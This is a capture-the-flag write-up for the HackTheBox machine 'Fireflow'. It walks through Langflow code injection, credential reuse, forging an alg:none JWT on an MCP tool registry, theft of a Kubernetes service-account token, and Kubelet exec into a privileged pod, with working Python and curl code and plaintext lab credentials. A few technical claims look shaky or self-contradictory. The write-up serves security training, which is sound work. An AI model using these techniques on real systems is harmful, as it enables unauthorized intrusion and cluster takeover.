# Fireflow — HackTheBox Writeup

**Difficulty:** Medium  
**OS:** Linux  
**Tags:** Langflow, RCE, Kubernetes, K3s, JWT, MCP, RBAC

---

## Enumeration

A quick Nmap scan reveals several open ports:

```
22/tcp   - SSH
80/tcp   - HTTP (redirects to HTTPS)
443/tcp  - HTTPS (Langflow)
30080/tcp - NodePort (MCP Tool Registry)
10250/tcp - Kubernetes Kubelet API
```

The HTTPS service at port 443 is running **Langflow v1.8.2** — an open-source framework for building LLM-powered flows. The login page requires credentials, but there's a lot more accessible without them.

The service at port 30080 exposes an MCP (Model Context Protocol) Tool Registry API. Browsing `/api/v1/docs` (Swagger) reveals authentication, tool registration, and tool execution endpoints.

---

## Initial Access — Langflow Unauthenticated RCE

Langflow exposes a `/api/v1/run/{flow_id}` endpoint that executes a stored flow. Normally this requires a session, but when `LANGFLOW_AUTO_LOGIN=False` and a flow is configured as **"public"**, the endpoint can be accessed without authentication.

Enumerating the flows endpoint (`/api/v1/flows/`) doesn't work unauthenticated, but knowing or guessing a flow ID lets you hit the run endpoint directly. The key parameter is `stream=false` to get a synchronous JSON response.

The flow itself contains a Python Code component. Crafting a JSON body that injects arbitrary Python code into the flow input allows code execution as **www-data**:

```python
# Injected via flow input
import subprocess
result = subprocess.run(['id'], capture_output=True, text=True)
print(result.stdout)
```

POST `/api/v1/run/7d84d636-af65-42e4-ac38-26e867052c25?stream=false`

```json
{
  "input_value": "<injected payload>",
  "input_type": "chat",
  "output_type": "chat"
}
```

Response contains command output — we have RCE as **www-data**.

Reading `/etc/langflow/.env` reveals the Langflow superuser credentials and a curious secret key. Reading `/app/main.py` inside the MCP server pod source (more on this below) is not yet accessible, but we can look around the filesystem.

From the RCE we read `/home/nightfall/.mcp/config.json`:

```json
{
  "server": "http://10.129.244.214:30080",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

And from `/etc/langflow/.env`:

```
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
```

---

## User Flag — Credential Reuse

The Langflow superuser password `n1ghtm4r3_b4_n1ghtf4ll` is reused for the system user **nightfall**:

```bash
ssh nightfall@10.129.244.214
# password: n1ghtm4r3_b4_n1ghtf4ll
```

```
user.txt: ffe1913cf5192e7e77f62b9174d199a2
```

---

## Privilege Escalation — K8s Cluster Takeover via Kubelet Exec

### Recon: Kubernetes Cluster

The machine runs **K3s v1.34.6+k3s1** — a lightweight Kubernetes distribution. From nightfall's context we can see K3s is running and port 10250 (Kubelet API) is open locally.

nightfall has no sudo access and is in no special groups. Standard privesc paths are dead ends. The interesting vector is the K8s cluster.

### Step 1: JWT alg:none on MCP Tool Registry

The MCP Tool Registry at port 30080 uses JWTs for authentication. Reading the service source (accessible via the Langflow RCE) reveals:

- `JWT_SECRET = "mcp-jwt-secret-do-not-share"`
- Admin check: `role == "admin"` in the JWT payload
- **The signature is never verified for `alg: none`**

Forging an admin JWT:

```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).rstrip(b"=").decode()
token = f"{header}.{payload}."
```

Using this token to register a tool with arbitrary Python code and calling it via the MCP protocol gives code execution inside the **mcp-server pod**.

### Step 2: Extract the mcp-sa Kubernetes Service Account Token

Inside the MCP pod, the Kubernetes service account token is mounted at the standard path:

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

Checking this SA's RBAC permissions against the API server:

```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://127.0.0.1:6443/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"resource":"nodes","subresource":"proxy","verb":"get"}}}'
```

Result: **allowed**. The `mcp-sa` service account has `get nodes/proxy` — a permission that lets it proxy requests to the Kubelet API on any node.

### Step 3: Enumerate Pods via Kubelet

Using `nodes/proxy` to hit the Kubelet's `/pods` endpoint:

```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://k8s-api:6443/api/v1/nodes/fireflow/proxy/pods"
```

Key finding: the `monitoring` namespace contains `prometheus-prometheus-node-exporter-nmntq` with a very interesting pod spec:

```yaml
securityContext:
  runAsUser: 0   # runs as root
hostPID: true
hostNetwork: true
volumeMounts:
  - mountPath: /host/root
    name: root
    readOnly: true
volumes:
  - hostPath:
      path: /
    name: root
```

The **node-exporter** pod runs as root, has `hostPID` enabled, and mounts the **entire host filesystem** at `/host/root`. Reading `/host/root/root/root.txt` from inside this container would give us the flag.

### Step 4: Kubelet Exec — The Non-Obvious Part

The Kubelet exposes a debug exec endpoint directly at port 10250:

```
GET /exec/{namespace}/{pod}/{container}?command=...&stdout=1
```

Direct access to port 10250 works because the mcp-sa token is accepted by the Kubelet (Webhook auth mode delegates to the API server, which allows it via `get nodes/proxy`).

However, every attempt to exec returns:

```
HTTP 400: you must specify at least 1 of stdin, stdout, stderr
```

This is puzzling — `stdout=1` and `stdout=true` both fail. After testing all combinations, the answer turns out to be a version quirk: **K3s v1.34.6's Kubelet uses the old K8s API parameter names** (`output`/`error`/`input`) instead of the modern ones (`stdout`/`stderr`/`stdin`). Only `output=1` works, not `stdout=1`.

Additionally, the exec endpoint requires a proper **WebSocket upgrade** (the connection must negotiate `v4.channel.k8s.io` subprotocol). The response then comes back as binary WebSocket frames where the first byte of each payload indicates the channel:

- `0x01` = stdout
- `0x02` = stderr

Here is the working Python exec client:

```python
import ssl, socket, base64, os, struct

TOKEN = "<mcp-sa-token>"
HOST = "10.129.244.214"
PORT = 10250
NS = "monitoring"
POD = "prometheus-prometheus-node-exporter-nmntq"
CONT = "node-exporter"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

sock = socket.create_connection((HOST, PORT), timeout=10)
ssock = ctx.wrap_socket(sock, server_hostname=HOST)

key = base64.b64encode(os.urandom(16)).decode()
cmd_params = "&command=cat&command=/host/root/root/root.txt"
path = f"/exec/{NS}/{POD}/{CONT}?output=1&error=1{cmd_params}"

req = (
    f"GET {path} HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    f"Authorization: Bearer {TOKEN}\r\n"
    f"Upgrade: websocket\r\n"
    f"Connection: Upgrade\r\n"
    f"Sec-WebSocket-Key: {key}\r\n"
    f"Sec-WebSocket-Protocol: v4.channel.k8s.io\r\n"
    f"Sec-WebSocket-Version: 13\r\n"
    f"\r\n"
)
ssock.sendall(req.encode())

# ... read headers, then parse WebSocket frames ...
# Each frame: opcode, payload_len, payload
# payload[0] = channel (1=stdout, 2=stderr)
# payload[1:] = data
```

Running `cat /host/root/root/root.txt` through the node-exporter container (which mounts `/` → `/host/root`) returns the root flag.

```
root.txt: a454160461e7125463d0418177446364
```

---

## Summary

| Step | Technique |
|------|-----------|
| RCE as www-data | Langflow public flow endpoint + Python code injection |
| www-data → nightfall | Credential reuse (`n1ghtm4r3_b4_n1ghtf4ll`) |
| nightfall → K8s SA | MCP JWT `alg:none` bypass → mcp-sa token |
| K8s SA → root | `get nodes/proxy` → Kubelet exec on node-exporter (hostPID, mounts /) |

The key lessons:
- **Langflow**: public flows are dangerous — anyone can call them and inject data that gets executed.
- **JWT alg:none**: always validate the algorithm server-side; accept only the expected algorithm.
- **K8s RBAC `nodes/proxy`**: even a single `get nodes/proxy` permission can lead to cluster compromise if there's a privileged pod running on the node.
- **Kubelet exec quirk**: K3s uses legacy parameter names (`output`/`error`) for exec — a small but decisive difference from standard kubectl behavior.
